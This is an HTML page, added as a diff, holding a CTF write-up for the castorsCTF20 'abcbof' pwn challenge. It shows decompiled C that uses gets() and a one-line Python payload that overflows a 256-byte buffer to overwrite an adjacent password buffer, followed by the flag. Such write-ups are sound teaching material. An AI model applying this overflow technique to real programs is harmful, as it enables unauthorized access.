@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>abcbof :: Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="The executable file wants a password from us. So let&amp;rsquo;s see if it uses strcmp for comparing it. If that, and the text isn&amp;rsquo;t encyripted we should able to see the password. So let&amp;rsquo;s run ltrace ./abcbof and give aaaa for password. Here is the password! But when we tried it, it didn&amp;rsquo;t work.
+We can use ghidra for seeing why it didn&amp;rsquo;t work.
+undefined8 main(void) { int iVar1; char local_118 [256]; char local_18 [16]; printf(&amp;#34;Hello everyone, say your name: &amp;#34;); gets(local_118); iVar1 = strcmp(&amp;#34;CyberCastors&amp;#34;,local_18); if (iVar1 == 0) { get_flag(); } puts(&amp;#34;You lose!" />
+<meta name="keywords" content="blog" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/writups/castorsctf20/abcbof/" />
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+  <link rel="stylesheet" href="/assets/blue.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="/img/favicon/blue.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  <meta name="twitter:site" content="" />
+
+<meta name="twitter:creator" content="tozkoparan (Ahmed Selim Üzüm)" />
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="abcbof :: Blog">
+<meta property="og:description" content="The executable file wants a password from us. So let&amp;rsquo;s see if it uses strcmp for comparing it. If that, and the text isn&amp;rsquo;t encyripted we should able to see the password. So let&amp;rsquo;s run ltrace ./abcbof and give aaaa for password. Here is the password! But when we tried it, it didn&amp;rsquo;t work.
+We can use ghidra for seeing why it didn&amp;rsquo;t work.
+undefined8 main(void) { int iVar1; char local_118 [256]; char local_18 [16]; printf(&amp;#34;Hello everyone, say your name: &amp;#34;); gets(local_118); iVar1 = strcmp(&amp;#34;CyberCastors&amp;#34;,local_18); if (iVar1 == 0) { get_flag(); } puts(&amp;#34;You lose!" />
+<meta property="og:url" content="/writups/castorsctf20/abcbof/" />
+<meta property="og:site_name" content="abcbof" />
+
+  
+    <meta property="og:image" content="/img/favicon/blue.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Ahmed Selim Üzüm
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="https://github.com/ahmedselim2017">Github</a></li>
+        
+      
+        
+          <li><a href="/writups">CTF Writups</a></li>
+        
+      
+      
+    
+
+    
+    <div class="spacer"></div>
+    <ul class="language-selector">
+      <ul class="language-selector-current">
+          <li>English ▾</li>
+      </ul>
+      <ul class="language-selector__more hidden">
+        
+        <li><a href="/">English</a></li>
+        
+        <li><a href="/tr/">Türkçe</a></li>
+        
+      </ul>
+    </ul>
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="https://github.com/ahmedselim2017">Github</a></li>
+      
+    
+      
+        <li><a href="/writups">CTF Writups</a></li>
+      
+    
+    
+    <hr />
+        
+          <li>
+            <a href="/">English</a>
+          </li>
+        
+          <li>
+            <a href="/tr/">Türkçe</a>
+          </li>
+        
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="/writups/castorsctf20/abcbof/">abcbof</a></h1>
+  <div class="post-meta">
+    
+    
+    <span class="post-author">::
+      tozkoparan (Ahmed Selim Üzüm)
+    </span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="/tags/writeup/">writeup</a>&nbsp;
+    
+    #<a href="/tags/pwn/">pwn</a>&nbsp;
+    
+    #<a href="/tags/castorsctf20/">castorsCTF20</a>&nbsp;
+    
+  </span>
+  
+
+  
+
+  
+
+  <div class="post-content"><div>
+        <p>The executable file wants a password from us. So let&rsquo;s see if it uses <code>strcmp</code>
+for comparing it. If that, and the text isn&rsquo;t encyripted we should able to see the
+password. So let&rsquo;s run <code>ltrace ./abcbof</code> and give <code>aaaa</code> for password. Here is the
+password! But when we tried it, it didn&rsquo;t work.</p>
+<p>We can use <code>ghidra</code> for seeing why it didn&rsquo;t work.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">undefined8 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
+
+{
+  <span style="color:#66d9ef">int</span> iVar1;
+  <span style="color:#66d9ef">char</span> local_118 [<span style="color:#ae81ff">256</span>];
+  <span style="color:#66d9ef">char</span> local_18 [<span style="color:#ae81ff">16</span>];
+
+  printf(<span style="color:#e6db74">&#34;Hello everyone, say your name: &#34;</span>);
+  gets(local_118);
+  iVar1 <span style="color:#f92672">=</span> strcmp(<span style="color:#e6db74">&#34;CyberCastors&#34;</span>,local_18);
+  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+    get_flag();
+  }
+  puts(<span style="color:#e6db74">&#34;You lose!&#34;</span>);
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>We can now see it didn&rsquo;t work because our input is inside <code>local_118</code> and checked
+password is inside <code>local_18</code>. But because gets is vulnerable, if we first print
+256 times A and then the correct password we can get the flag!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"> python -c <span style="color:#e6db74">&#34;print(&#39;A&#39;*256 + &#39;CyberCastors&#39;)&#34;</span> | ./abcbof
+</code></pre></div><p><strong>Flag:</strong> <code>castorsCTF{b0f_4r3_n0t_th4t_h4rd_or_4r3_th3y?}</code></p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/writups/castorsctf20/arithmetics/">
+                <span class="button__text">Arithmetics</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>Ahmed Selim Üzüm</span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
